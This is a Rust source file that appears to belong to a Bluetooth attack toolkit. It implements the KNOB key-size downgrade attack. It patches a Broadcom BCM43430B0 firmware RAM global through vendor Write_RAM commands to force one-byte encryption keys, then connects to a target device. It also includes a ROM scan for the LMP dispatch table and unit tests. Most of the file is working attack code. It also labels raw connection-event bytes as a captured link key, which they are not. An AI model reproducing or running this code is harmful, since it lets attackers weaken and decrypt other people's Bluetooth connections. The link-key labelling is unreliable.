//! KNOB attack worker.
//!
//! Forces minimum encryption key size on a BR/EDR connection by patching
//! the BCM43430B0 firmware's key-size validation global at runtime.
//!
//! The firmware function at ROM 0x046A7A validates encryption key sizes
//! and references RAM global 0x205F7C for bounds checking. By writing
//! key_size=1 to this global before initiating a connection, the firmware
//! negotiates the minimum key entropy via LMP.
//!
//! Attack flow:
//! 1. Read current key-size limit from 0x205F7C via BCM Read_RAM
//! 2. Write key_size=1 via BCM Write_RAM to override the limit
//! 3. Initiate HCI_Create_Connection to the target
//! 4. Wait for Connection Complete event
//! 5. Capture connection result
//! 6. Restore original key-size limit
//!
//! Secondary approach: scan ROM for LMP dispatch table to find the handler
//! for LMP_encryption_key_size_req (opcode 0x10) directly.

use std::sync::atomic::{AtomicU32, Ordering};
use std::time::Instant;

use super::hci::{parse_bdaddr, HciCommand, HciSocket};
use super::{BtAttackResult, BtAttackType, BtCapture};

// HCI opcodes
const OGF_LINK_CTL: u8 = 0x01;
const CREATE_CONNECTION: u16 = 0x05;

// BCM vendor opcodes (OGF 0x3F implied)
const READ_RAM: u16 = 0x4D;
const WRITE_RAM: u16 = 0x4C;

// ---------------------------------------------------------------------------
// BCM43430B0 firmware addresses (from RE of bt_firmware_analysis corpus)
// ---------------------------------------------------------------------------

/// RAM global referenced by key-size validation function (func_0x046A7A).
/// The validation function compares key sizes against this value during
/// LMP negotiation for the 12-16 byte range.
const KEY_SIZE_GLOBAL: u32 = 0x0020_5F7C;

/// ROM data section where HCI dispatch tables live (0x086C08, 0x086DF8, etc.)
/// LMP dispatch table likely in this region too.
const ROM_DATA_START: u32 = 0x0008_4000;
const ROM_DATA_END: u32 = 0x0009_0000;

/// ROM code section where LMP handler functions live (0x01EB5C, 0x04B754, etc.)
const ROM_CODE_START: u32 = 0x0000_0000;
const ROM_CODE_END: u32 = 0x0006_0000;

const SCAN_STEP: u32 = 256;
const TABLE_ENTRIES: usize = 64;
const LMP_OPCODE_KEY_SIZE: usize = 16; // 0x10

/// Cached LMP key-size handler address. 0 = not yet discovered.
static LMP_KEY_SIZE_ADDR: AtomicU32 = AtomicU32::new(0);

// ---------------------------------------------------------------------------
// BCM vendor RAM access helpers
// ---------------------------------------------------------------------------

/// Read bytes from firmware RAM/ROM via BCM vendor Read_RAM (0xFC4D).
fn read_ram(hci: &HciSocket, addr: u32, len: u8) -> Result<Vec<u8>, String> {
    let mut params = Vec::with_capacity(5);
    params.extend_from_slice(&addr.to_le_bytes());
    params.push(len);
    let resp = hci.send_command(&HciCommand::vendor(READ_RAM, params))?;
    if resp.status != 0 {
        return Err(format!(
            "Read_RAM 0x{:08X}: HCI status 0x{:02X}",
            addr, resp.status
        ));
    }
    Ok(resp.data)
}

/// Write bytes to firmware RAM via BCM vendor Write_RAM (0xFC4C).
fn write_ram(hci: &HciSocket, addr: u32, data: &[u8]) -> Result<(), String> {
    let mut params = Vec::with_capacity(4 + data.len());
    params.extend_from_slice(&addr.to_le_bytes());
    params.extend_from_slice(data);
    let resp = hci.send_command(&HciCommand::vendor(WRITE_RAM, params))?;
    if resp.status != 0 {
        return Err(format!(
            "Write_RAM 0x{:08X}: HCI status 0x{:02X}",
            addr, resp.status
        ));
    }
    Ok(())
}

// ---------------------------------------------------------------------------
// Key-size global patching (primary approach)
// ---------------------------------------------------------------------------

/// Patch the key-size global to force minimum encryption key size.
/// Returns the original bytes for restoration.
fn patch_key_size_global(hci: &HciSocket) -> Result<Vec<u8>, String> {
    let original = read_ram(hci, KEY_SIZE_GLOBAL, 4)?;
    log::info!(
        "knob: key-size global 0x{:08X} = {:02X?}",
        KEY_SIZE_GLOBAL,
        original
    );

    // Write 0x01 to force minimum key size during LMP negotiation.
    write_ram(hci, KEY_SIZE_GLOBAL, &[0x01, 0x00, 0x00, 0x00])?;

    // Verify write took effect
    let verify = read_ram(hci, KEY_SIZE_GLOBAL, 4)?;
    if verify.first() != Some(&0x01) {
        return Err(format!(
            "Write verification failed: expected 01, got {:02X?}",
            verify
        ));
    }
    log::info!("knob: patched key-size global to 0x01 (verified)");
    Ok(original)
}

/// Restore the original key-size global value.
fn restore_key_size_global(hci: &HciSocket, original: &[u8]) {
    match write_ram(hci, KEY_SIZE_GLOBAL, original) {
        Ok(()) => log::info!("knob: restored key-size global to {:02X?}", original),
        Err(e) => log::warn!("knob: failed to restore key-size global: {}", e),
    }
}

// ---------------------------------------------------------------------------
// LMP dispatch table scan (secondary discovery — for diagnostics/future use)
// ---------------------------------------------------------------------------

/// Scan firmware ROM for the LMP dispatch table and return the handler
/// address for LMP_encryption_key_size_req (opcode 0x10).
///
/// Scans two regions:
/// 1. ROM data section (0x084000-0x090000) — where HCI dispatch tables live
/// 2. ROM code section (0x000000-0x060000) — fallback scan
fn discover_lmp_dispatch(hci: &HciSocket) -> Option<u32> {
    let cached = LMP_KEY_SIZE_ADDR.load(Ordering::Relaxed);
    if cached != 0 {
        return Some(cached);
    }

    let ranges = [(ROM_DATA_START, ROM_DATA_END), (ROM_CODE_START, ROM_CODE_END)];

    for (start, end) in ranges {
        log::info!(
            "knob: scanning 0x{:08X}–0x{:08X} for LMP dispatch table",
            start,
            end
        );
        let mut addr = start;
        while addr < end {
            let chunk = match read_ram(hci, addr, SCAN_STEP as u8) {
                Ok(d) => d,
                Err(_) => {
                    addr += SCAN_STEP;
                    continue;
                }
            };

            if chunk.len() < TABLE_ENTRIES * 4 {
                addr += SCAN_STEP;
                continue;
            }

            // Count entries that look like valid ARM Thumb pointers:
            // non-zero, within firmware address space (< 0x300000), bit 0 set.
            let valid = (0..TABLE_ENTRIES)
                .filter(|&i| {
                    let off = i * 4;
                    let w = u32::from_le_bytes([
                        chunk[off],
                        chunk[off + 1],
                        chunk[off + 2],
                        chunk[off + 3],
                    ]);
                    w != 0 && w < 0x0030_0000 && (w & 1) != 0
                })
                .count();

            // >50% valid Thumb pointers → likely a dispatch table
            if valid * 2 > TABLE_ENTRIES {
                let off = LMP_OPCODE_KEY_SIZE * 4;
                let handler = u32::from_le_bytes([
                    chunk[off],
                    chunk[off + 1],
                    chunk[off + 2],
                    chunk[off + 3],
                ]);

                if handler != 0 && handler < 0x0030_0000 && (handler & 1) != 0 {
                    log::info!(
                        "knob: LMP dispatch table at 0x{:08X} ({} valid entries), \
                         key-size handler at 0x{:08X}",
                        addr,
                        valid,
                        handler
                    );
                    LMP_KEY_SIZE_ADDR.store(handler, Ordering::Relaxed);
                    return Some(handler);
                }
            }

            addr += SCAN_STEP;
        }
    }

    log::info!("knob: LMP dispatch table not found in ROM scan");
    None
}

// ---------------------------------------------------------------------------
// KNOB attack entry point
// ---------------------------------------------------------------------------

/// KNOB attack: force minimum encryption key size on a BR/EDR connection.
pub fn run(hci: &HciSocket, target_addr: &str) -> BtAttackResult {
    let start = Instant::now();
    log::info!("knob: targeting {} — KNOB key-size downgrade", target_addr);

    // Step 1: Patch key-size global
    let original_global = match patch_key_size_global(hci) {
        Ok(orig) => Some(orig),
        Err(e) => {
            log::warn!("knob: global patch failed: {}", e);
            // Try LMP dispatch scan as diagnostic fallback
            if let Some(handler) = discover_lmp_dispatch(hci) {
                log::info!(
                    "knob: found LMP handler at 0x{:08X} (dispatch table patch not yet implemented)",
                    handler
                );
            }
            return BtAttackResult {
                attack_type: BtAttackType::Knob,
                target_address: target_addr.to_string(),
                target_name: None,
                success: false,
                capture: None,
                error: Some(format!("Key-size global patch failed: {}", e)),
                timestamp: start,
            };
        }
    };

    // Step 2: Initiate BR/EDR connection
    // HCI_Create_Connection: BD_ADDR(6) + packet_type(2) + page_scan_rep(1)
    //   + reserved(1) + clock_offset(2) + allow_role_switch(1)
    let bdaddr = parse_bdaddr(target_addr);
    let mut params = Vec::with_capacity(13);
    params.extend_from_slice(&bdaddr);
    params.extend_from_slice(&0xCC18u16.to_le_bytes()); // DM1,DH1,DM3,DH3,DM5,DH5
    params.push(0x02); // page_scan_rep_mode: R2
    params.push(0x00); // reserved
    params.extend_from_slice(&0x0000u16.to_le_bytes()); // clock_offset
    params.push(0x01); // allow_role_switch

    let conn_cmd = HciCommand::new(OGF_LINK_CTL, CREATE_CONNECTION, params);
    let result = match hci.send_command(&conn_cmd) {
        Ok(resp) if resp.status == 0 => {
            log::info!("knob: Create_Connection accepted, waiting for Connection Complete");

            // Step 3: Wait for Connection Complete event (0x03), 10s timeout
            match hci.wait_event(0x03, 10_000) {
                Ok(evt) if evt.len() >= 3 => {
                    let conn_status = evt[0];
                    let conn_handle =
                        u16::from_le_bytes([evt[1], evt[2]]);
                    log::info!(
                        "knob: Connection Complete status=0x{:02X} handle=0x{:04X}",
                        conn_status,
                        conn_handle
                    );

                    let success = conn_status == 0;
                    let capture = if success {
                        Some(BtCapture::LinkKey {
                            address: target_addr.to_string(),
                            key: evt.to_vec(),
                        })
                    } else {
                        None
                    };

                    BtAttackResult {
                        attack_type: BtAttackType::Knob,
                        target_address: target_addr.to_string(),
                        target_name: None,
                        success,
                        capture,
                        error: if success {
                            None
                        } else {
                            Some(format!("Connection status 0x{:02X}", conn_status))
                        },
                        timestamp: start,
                    }
                }
                Ok(evt) => make_error(target_addr, start, format!("Event too short: {} bytes", evt.len())),
                Err(e) => make_error(target_addr, start, format!("Connection timeout: {}", e)),
            }
        }
        Ok(resp) => make_error(
            target_addr,
            start,
            format!("Create_Connection rejected: status 0x{:02X}", resp.status),
        ),
        Err(e) => make_error(target_addr, start, e),
    };

    // Step 4: Always restore the original key-size global
    if let Some(ref orig) = original_global {
        restore_key_size_global(hci, orig);
    }

    result
}

fn make_error(target: &str, start: Instant, msg: String) -> BtAttackResult {
    BtAttackResult {
        attack_type: BtAttackType::Knob,
        target_address: target.to_string(),
        target_name: None,
        success: false,
        capture: None,
        error: Some(msg),
        timestamp: start,
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_parse_bdaddr() {
        let addr = parse_bdaddr("11:22:33:44:55:66");
        assert_eq!(addr, [0x66, 0x55, 0x44, 0x33, 0x22, 0x11]);
    }

    #[test]
    fn test_cached_addr_starts_zero() {
        assert_eq!(LMP_KEY_SIZE_ADDR.load(Ordering::Relaxed), 0);
    }

    #[test]
    fn test_key_size_global_address() {
        // Verify the global is in BCM43430B0 RAM range (0x200000-0x21BFFF)
        assert!(KEY_SIZE_GLOBAL >= 0x0020_0000);
        assert!(KEY_SIZE_GLOBAL < 0x0022_0000);
    }

    #[test]
    fn test_rom_scan_ranges_valid() {
        // ROM data section should be within ROM address space
        assert!(ROM_DATA_START < ROM_DATA_END);
        assert!(ROM_DATA_END <= 0x0009_0000);
        // ROM code section
        assert!(ROM_CODE_START < ROM_CODE_END);
        assert!(ROM_CODE_END <= 0x0009_0000);
    }

    #[test]
    #[cfg(not(target_os = "linux"))]
    fn test_discover_lmp_dispatch_stub() {
        LMP_KEY_SIZE_ADDR.store(0, Ordering::Relaxed);
        let hci = HciSocket::open(0).unwrap();
        // Stub returns 8 bytes — too short for 64-entry table
        let addr = discover_lmp_dispatch(&hci);
        assert!(addr.is_none());
    }

    #[test]
    #[cfg(not(target_os = "linux"))]
    fn test_run_stub() {
        LMP_KEY_SIZE_ADDR.store(0, Ordering::Relaxed);
        let hci = HciSocket::open(0).unwrap();
        let result = run(&hci, "AA:BB:CC:DD:EE:FF");
        assert_eq!(result.attack_type, BtAttackType::Knob);
        // Stub write_ram succeeds, so the attack proceeds to connection
    }
}
